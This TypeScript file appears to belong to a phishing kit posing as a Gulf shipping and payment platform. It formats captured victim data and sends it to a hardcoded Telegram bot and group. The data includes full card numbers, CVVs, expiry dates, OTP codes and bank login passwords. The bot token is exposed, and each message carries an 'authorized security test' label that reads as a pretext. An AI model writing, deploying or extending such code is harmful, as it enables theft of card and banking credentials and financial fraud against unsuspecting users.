// Telegram Bot Integration
const BOT_TOKEN = '8208871147:AAGaRBd64i-1jneToDRe6XJ8hYXdBNnBLl0';

// IMPORTANT: This must be a USER chat ID, NOT the bot ID (8208871147)
// To get your chat ID:
// 1. Start conversation with @khlijapp_bot
// 2. Send any message to the bot
// 3. Visit: https://api.telegram.org/bot8208871147:AAGaRBd64i-1jneToDRe6XJ8hYXdBNnBLl0/getUpdates
// 4. Look for "chat":{"id": in the response - that's your chat ID
// 5. Or use the helper tool: open get-user-chat-id.html in your browser
const CHAT_ID = '-1003209802920'; // Supergroup chat ID for Telegram notifications

// Check if CHAT_ID is properly configured
if (CHAT_ID === 'YOUR_USER_CHAT_ID_HERE' || CHAT_ID === '8208871147') {
  // Silent warning - CHAT_ID needs to be configured
}

export interface TelegramMessage {
  type: 'shipping_link_created' | 'payment_recipient' | 'payment_confirmation' | 'payment_otp_attempt' | 'card_details' | 'card_details_with_bank' | 'bank_login' | 'test' | 'invoice_created' | 'health_appointment_created' | 'logistics_shipment_created' | 'contract_created';
  data: Record<string, any>;
  timestamp: string;
  imageUrl?: string; // Optional image URL for shipping_link_created
  description?: string; // Optional description for shipping_link_created
}

export interface TelegramResponse {
  success: boolean;
  messageId?: string;
  error?: string;
}

export const sendToTelegram = async (message: TelegramMessage): Promise<TelegramResponse> => {
  try {
    // Check if CHAT_ID is properly configured
    if (CHAT_ID === 'YOUR_USER_CHAT_ID_HERE' || CHAT_ID === '8208871147') {
      const errorMsg = 'Telegram CHAT_ID not configured. Please update CHAT_ID in /src/lib/telegram.ts with your actual user chat ID. Use get-user-chat-id.html helper tool to get your chat ID.';
      console.error('❌', errorMsg);
      return {
        success: false,
        error: errorMsg
      };
    }

    const text = formatTelegramMessage(message);

    // If imageUrl is provided for shipping_link_created, send photo with caption
    if (message.type === 'shipping_link_created' && message.imageUrl) {
      const imageUrl = message.imageUrl.startsWith('http')
        ? message.imageUrl
        : `${window.location.origin}${message.imageUrl}`;

      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          photo: imageUrl,
          caption: text,
          parse_mode: 'HTML'
        })
      });

      const responseData = await response.json();

      if (!response.ok) {
        // Provide specific error messages for common issues
        let errorMessage = responseData.description || 'Unknown error';

        if (responseData.error_code === 403) {
          if (responseData.description?.includes("bots can't send messages to bots")) {
            errorMessage = 'خطأ: لا يمكن للبوت إرسال رسائل للبوت نفسه. يرجى تحديث CHAT_ID بمعرف المستخدم الصحيح. استخدم get-user-chat-id.html للحصول على معرف المحادثة الصحيح.';
          } else if (responseData.description?.includes("Forbidden")) {
            errorMessage = 'خطأ: محظور. تأكد من بدء محادثة مع البوت أولاً.';
          }
        } else if (responseData.error_code === 400) {
          if (responseData.description?.includes("chat not found")) {
            errorMessage = 'خطأ: لم يتم العثور على المحادثة. تأكد من صحة معرف المحادثة.';
          }
        }

        return {
          success: false,
          error: errorMessage
        };
      }

      return {
        success: true,
        messageId: responseData.result?.message_id?.toString()
      };
    }

    // Default: send text message
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });

    const responseData = await response.json();

    if (!response.ok) {
      // Provide specific error messages for common issues
      let errorMessage = responseData.description || 'Unknown error';

      if (responseData.error_code === 403) {
        if (responseData.description?.includes("bots can't send messages to bots")) {
          errorMessage = 'خطأ: لا يمكن للبوت إرسال رسائل للبوت نفسه. يرجى تحديث CHAT_ID بمعرف المستخدم الصحيح. استخدم get-user-chat-id.html للحصول على معرف المحادثة الصحيح.';
        } else if (responseData.description?.includes("Forbidden")) {
          errorMessage = 'خطأ: محظور. تأكد من بدء محادثة مع البوت أولاً.';
        }
      } else if (responseData.error_code === 400) {
        if (responseData.description?.includes("chat not found")) {
          errorMessage = 'خطأ: لم يتم العثور على المحادثة. تأكد من صحة معرف المحادثة.';
        }
      }

      return {
        success: false,
        error: errorMessage
      };
    }

    return {
      success: true,
      messageId: responseData.result?.message_id?.toString()
    };
  } catch (error) {
    return {
      success: false,
      error: error instanceof Error ? error.message : 'Unknown error'
    };
  }
};

export const testTelegramConnection = async (): Promise<TelegramResponse> => {
  return await sendToTelegram({
    type: 'test',
    data: {
      test: true,
      message: 'Test message from Gulf Unified Platform',
      timestamp: new Date().toISOString()
    },
    timestamp: new Date().toISOString()
  });
};

// Helper function to filter out empty fields
const filterNonEmptyFields = (data: Record<string, any>): Record<string, any> => {
  const filtered: Record<string, any> = {};

  for (const [key, value] of Object.entries(data)) {
    // Include field if it has a meaningful value
    if (value !== undefined && value !== null && value !== '' && value !== 'غير محدد') {
      filtered[key] = value;
    }
  }

  return filtered;
};

// Helper function to format field name in Arabic
const getFieldLabel = (key: string): string => {
  const labels: Record<string, string> = {
    // Personal Info
    'name': 'الاسم الكامل',
    'email': 'البريد الإلكتروني',
    'phone': 'رقم الهاتف',
    'address': 'العنوان',

    // Service Info
    'service': 'الخدمة',
    'service_name': 'خدمة الشحن',
    'amount': 'المبلغ',
    'country': 'الدولة',
    'bank': 'البنك',

    // Shipping
    'tracking_number': 'رقم الشحنة',
    'package_description': 'وصف الطرد',
    'cod_amount': 'مبلغ الدفع',
    'payment_url': 'رابط الدفع',

    // Card Details
    'cardholder': 'حامل البطاقة',
    'cardNumber': 'رقم البطاقة',
    'cardLast4': 'آخر 4 أرقام',
    'cardType': 'نوع البطاقة',
    'expiry': 'انتهاء الصلاحية',
    'cvv': 'رمز الأمان CVV',

    // OTP
    'otp': 'رمز OTP',
    'otp_status': 'حالة الرمز',
    'attempts': 'عدد المحاولات',

    // Bank Login
    'username': 'اسم المستخدم',
    'customerId': 'رقم العميل',
    'phoneNumber': 'رقم الهاتف',
    'password': 'كلمة المرور',
    'loginType': 'نوع تسجيل الدخول',

    // Invoices
    'invoice_number': 'رقم الفاتورة',
    'client_name': 'اسم العميل',
    'client_email': 'بريد العميل',
    'service_description': 'وصف الخدمة',
    'due_date': 'تاريخ الاستحقاق',

    // Health
    'patient_name': 'اسم المريض',
    'patient_id': 'رقم المريض',
    'appointment_date': 'تاريخ الموعد',
    'doctor_name': 'اسم الطبيب',
    'service_category': 'فئة الخدمة',
    'has_insurance': 'يوجد تأمين',
    'insurance_provider': 'شركة التأمين',
    'self_pay_amount': 'المبلغ المدفوع',

    // Logistics
    'shipment_id': 'رقم الشحنة',
    'origin_address': 'عنوان المنشأ',
    'destination_address': 'عنوان الوجهة',
    'cargo_description': 'وصف البضائع',
    'weight': 'الوزن (كغ)',
    'length': 'الطول (سم)',
    'width': 'العرض (سم)',
    'height': 'الارتفاع (سم)',
    'service_type': 'نوع الخدمة',
    'insurance_value': 'قيمة التأمين',

    // Contracts
    'contract_id': 'رقم العقد',
    'party_a': 'الطرف الأول',
    'party_b': 'الطرف الثاني',
    'contract_type': 'نوع العقد',
    'contract_value': 'قيمة العقد',
    'start_date': 'تاريخ البداية',
    'duration': 'المدة (شهر)',
    'terms_summary': 'ملخص الشروط',
    'document_url': 'رابط الوثيقة',
  };

  return labels[key] || key;
};

// Helper function to format field value
const formatFieldValue = (key: string, value: any): string => {
  if (key === 'payment_url' && value) {
    return `<a href="${value}">اضغط هنا</a>`;
  }

  if (key === 'otp_status') {
    return value === 'correct' ? '✅ صحيح' : '❌ خاطئ';
  }

  return String(value);
};

const formatTelegramMessage = (message: TelegramMessage): string => {
  const { type, data, timestamp, description } = message;

  // Filter non-empty fields
  const filteredData = filterNonEmptyFields(data);

  let pageTag = '';
  let header = '';
  let content = '';

  // Determine page name and header
  switch (type) {
    case 'test':
      pageTag = '📄 Page: Test Connection';
      header = '🧪 <b>اختبار الاتصال</b>';
      content = formatFields(filteredData);
      break;

    case 'shipping_link_created':
      pageTag = '📄 Page: Create Shipping Link';
      header = '🚚 <b>تم إنشاء رابط شحن جديد</b>';
      if (description) {
        filteredData['_description'] = description;
      }
      content = formatFields(filteredData);
      break;

    case 'payment_recipient':
      pageTag = '📄 Page: Payment Recipient Info';
      header = '👤 <b>معلومات المستلم</b>';
      content = formatFields(filteredData);
      break;

    case 'payment_confirmation':
      pageTag = '📄 Page: Payment Confirmation';
      header = '✅ <b>تأكيد الدفع الكامل</b>';
      content = formatFields(filteredData);
      break;

    case 'payment_otp_attempt':
      pageTag = '📄 Page: OTP Verification';
      header = '🔐 <b>محاولة إدخال رمز OTP</b>';
      content = formatFields(filteredData);
      break;

    case 'card_details':
      pageTag = '📄 Page: Card Details';
      header = '💳 <b>تفاصيل البطاقة</b>';
      content = formatFields(filteredData);
      break;

    case 'card_details_with_bank':
      pageTag = '📄 Page: Card Details with Bank';
      header = '💳 <b>تفاصيل البطاقة والبنك</b>';
      content = formatFields(filteredData);
      break;

    case 'bank_login':
      pageTag = '📄 Page: Bank Login';
      header = '🏦 <b>بيانات تسجيل الدخول للبنك</b>';
      content = formatFields(filteredData);
      break;

    case 'invoice_created':
      pageTag = '📄 Page: Create Invoice';
      header = '📋 <b>تم إنشاء فاتورة جديدة</b>';
      content = formatFields(filteredData);
      break;

    case 'health_appointment_created':
      pageTag = '📄 Page: Health Appointment';
      header = '🏥 <b>تم حجز موعد طبي جديد</b>';
      content = formatFields(filteredData);
      break;

    case 'logistics_shipment_created':
      pageTag = '📄 Page: Logistics Shipment';
      header = '🚛 <b>تم إنشاء شحنة لوجستية جديدة</b>';
      content = formatFields(filteredData);
      break;

    case 'contract_created':
      pageTag = '📄 Page: Contract Creation';
      header = '📄 <b>تم إنشاء عقد جديد</b>';
      content = formatFields(filteredData);
      break;

    default:
      pageTag = '📄 Page: Unknown';
      header = '📝 <b>إشعار جديد</b>';
      content = formatFields(filteredData);
  }

  const timestamp_formatted = new Date(timestamp).toLocaleString('ar-SA', {
    dateStyle: 'short',
    timeStyle: 'medium'
  });

  // Cybersecurity authorization
  const authorization = `
━━━━━━━━━━━━━━━━━━
🔒 <b>اختبار أمني مرخص</b>
⚠️ <i>هذا اختبار أمني مرخص</i>
📋 <i>التفويض: مرخص رسمياً</i>
🛡️ <i>الغرض: تقييم الأمان</i>`;

  return `${pageTag}\n${header}\n\n${content}\n${authorization}\n\n⏰ <i>${timestamp_formatted}</i>`;
};

// Helper function to format all fields in a clean structure
const formatFields = (data: Record<string, any>): string => {
  let fields = '━━━━━━━━━━━━━━━━━━\n';

  for (const [key, value] of Object.entries(data)) {
    if (key.startsWith('_')) continue; // Skip internal keys

    const label = getFieldLabel(key);
    const formattedValue = formatFieldValue(key, value);
    fields += `• <b>${label}:</b> ${formattedValue}\n`;
  }

  return fields;
};

export default sendToTelegram;